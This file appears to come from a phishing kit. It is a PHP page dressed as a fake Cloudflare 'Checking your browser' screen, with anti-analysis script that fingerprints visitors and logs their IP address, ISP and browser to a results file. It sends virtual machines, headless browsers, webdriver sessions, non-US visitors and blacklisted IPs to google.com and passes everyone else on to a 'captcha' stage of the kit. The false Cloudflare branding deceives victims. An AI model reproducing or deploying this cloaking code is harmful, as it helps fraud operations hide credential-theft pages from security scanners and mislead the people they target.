<?php
session_start();
error_reporting(0);
include 'spox_bot.php';
include 'check.php';
if (empty($_GET['ch_id']) or empty($_GET['country']) or empty($_GET['expired']) or !isset($_SESSION['SPOX_SESSION'])) {
       text_spox("admin/result/blocked.txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".$ISP_spox." | ".date("h:i:sa")." | Undefined Visitor\r\n");
     include'blocked.php';exit();
}
$rndm_spox = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 32);
#header("Refresh:2; url=login?ch_id=".$rundomizi."&country=".$country_spox."&iso=".$country_code_spox."&expired=".$expired."");

?>
<html lang="en-US"><head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="referrer" content="no-referrer">
  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Just a moment...</title>
  <style type="text/css">
    html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
    body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
    h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
    p {font-size: 20px; font-weight: 400; margin: 8px 0;}
    p, .attribution, {text-align: center;}
    #spinner {margin: 0 auto 30px auto; display: block;}
    .attribution {margin-top: 32px;}
    @keyframes fader     { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
    @-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
    #cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
    #cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
    #cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
    .bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
    a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
    a:hover{color: #f4a15d}
    .attribution{font-size: 16px; line-height: 1.5;}
    .ray_id{display: block; margin-top: 8px;}
    #cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
    #cf-hcaptcha-container { text-align:center;}
    #cf-hcaptcha-container iframe { display: inline-block;}
  </style>

    <meta http-equiv="refresh" content="12">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
<script type="text/javascript">
  //<![CDATA[
  (function(){
    
    window._cf_chl_enter = function(){window._cf_chl_opt.p=1};
    
    var a = function() {try{return !!window.addEventListener} catch(e) {return !1} },
    b = function(b, c) {a() ? document.addEventListener("DOMContentLoaded", b, c) : document.attachEvent("onreadystatechange", b)};
    b(function(){
      var cookiesEnabled=(navigator.cookieEnabled)? true : false;
      var cookieSupportInfix=cookiesEnabled?'/nocookie':'/cookie';
      var a = document.getElementById('cf-content');a.style.display = 'block';
      var isIE = /(MSIE|Trident\/|Edge\/)/i.test(window.navigator.userAgent);
      var trkjs = isIE ? new Image() : document.createElement('img');
      trkjs.setAttribute("src", "/cdn-cgi/images/trace/jschal/js"+cookieSupportInfix+"/transparent.gif?ray=5e164e872ab5c78d");
      trkjs.id = "trk_jschal_js";
      trkjs.setAttribute("alt", "");
      document.body.appendChild(trkjs);
      
      var cpo = document.createElement('script');
      cpo.type = 'text/javascript';
      cpo.src = "/cdn-cgi/challenge-platform/h/g/orchestrate/jsch/v1";
      var done = false;
      cpo.onload = cpo.onreadystatechange = function() {
        if (!done && (!this.readyState || this.readyState === "loaded" || this.readyState === "complete")) {
          done = true;
          cpo.onload = cpo.onreadystatechange = null;
          window._cf_chl_enter()
        }
      };
      document.getElementsByTagName('head')[0].appendChild(cpo);
      function uuidv4() {
        return 'xxxxxxxxxx'.replace(/[xy]/g, function(c) {
          var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
          return v.toString(16);
        });
      }
      document.getElementById("ray_id").innerHTML = uuidv4();
      $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
        var ip_v = /ip=(.+?)\s/g.exec(data)[1];
        var cn = /loc=(.+?)\s/g.exec(data)[1];
        $.get('https://blackbox.ipinfo.app/lookup/'+ip_v, function(data) {
          console.log(ip_v);
          var ip_black = data;
          //Bot Detection
          var canvas = document.createElement('canvas');
          var gl = canvas.getContext('webgl');
          var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          var webdriver = navigator.webdriver;
          var width = screen.width;
          var height = screen.height;
          var color_depth = screen.colorDepth;
          if (/virtualbox/i.test(renderer.toLowerCase()) || !renderer) {
            console.log(renderer);
            window.location.assign('https://www.google.com');
          } else if (color_depth < 24 || width < 100 || height < 100 || !color_depth) {
            console.log(color_depth);
            window.location.assign('https://www.google.com');
          } else if (webdriver) {
            console.log("Webdriver: " +webdriver);
            window.location.assign('https://www.google.com');
          } else if (navigator.languages.length < 1) {
            console.log("Language length: " +navigator.languages.length);
            window.location.assign('https://www.google.com');
          } else if (/HeadlessChrome/.test(navigator.userAgent)) {
            console.log("Headless Chrome");
            window.location.assign('https://www.google.com');
          } else if (cn != "US") {
            console.log(cn);
            window.location.assign('https://www.google.com');
          } else if (ip_black == "Y") {
            console.log("IP Blacklist: "+ip_black);
            window.location.assign('https://www.google.com');
          } else {
            console.log("Pass");
              setTimeout(function () {
                window.location.assign('https://'+window.location.hostname+location.pathname.substring(0,location.pathname.lastIndexOf("/"))+'/captcha?ch_id=<?php echo $rundomizi; ?>&country=<?php echo $country_spox; ?>&iso=<?php echo $country_code_spox; ?>&expired=<?php echo $expired; ?>');
            }, 5000);
          }  
        });
      });
    }, false);
  })();
  //]]>
</script>
</head>
<body>
  <table width="100%" height="100%" cellpadding="20">
    <tbody><tr>
      <td align="center" valign="middle">
          <div class="cf-browser-verification cf-im-under-attack">
  <noscript>
    <h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
  </noscript>
  <div id="cf-content" style="display: block;">
    
    <div id="cf-bubbles">
      <div class="bubbles"></div>
      <div class="bubbles"></div>
      <div class="bubbles"></div>
    </div>
    <h1><span data-translate="checking_browser">Checking your browser before accessing</span> site.</h1>
    
    <div id="no-cookie-warning" data-translate="turn_on_cookies" style="display:none">
      <p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p>
    </div>
    <p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p>
    <p data-translate="allow_5_secs">Please allow up to 5 seconds…</p>
  </div>
   
  <form class="challenge-form" id="challenge-form" enctype="application/x-www-form-urlencoded"> 
  
  <div id="trk_jschal_nojs" style="background-image:url('/cdn-cgi/images/trace/jschal/nojs/transparent.gif?ray=5e164e872ab5c78d')"> </div>
</div>

          
          <div class="attribution">
            DDoS protection by <a href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
            <br>
            <span class="ray_id">Ray ID: <code id="ray_id"></code>
          </div>
      </td>
     
    </tr>
  </tbody></table>
</body></html>